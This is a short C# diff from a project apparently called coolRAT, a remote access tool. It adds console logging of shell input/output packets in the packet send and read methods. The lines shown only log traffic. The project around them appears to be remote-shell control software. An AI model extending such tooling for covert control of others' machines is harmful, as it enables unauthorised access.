@@ -38,6 +38,12 @@ namespace coolRAT.Libs
         {
             Write(packet.Serialize());
             Console.WriteLine($"Sent packet of type {packet.Type}");
+
+            if(packet.Type == "Shell_IO_ChangedPacket")
+            {
+                Shell_IO_ChangedPacket packet__ = packet as Shell_IO_ChangedPacket;
+                Console.WriteLine($"ChangeType: {packet__.ChangeType}; Change: {packet__.Change}");
+            }
         }
 
         public string ReadPacket()
@@ -45,6 +51,12 @@ namespace coolRAT.Libs
             string json = Read();
             Packet packet = JsonConvert.DeserializeObject<Packet>(json);
             Console.WriteLine($"Received packet of type {packet.Type}");
+
+            if (packet.Type == "Shell_IO_ChangedPacket")
+            {
+                Shell_IO_ChangedPacket packet__ = Shell_IO_ChangedPacket.Deserialize(json);
+                Console.WriteLine($"ChangeType: {packet__.ChangeType}; Change: {packet__.Change}");
+            }
             return json;
         }
 
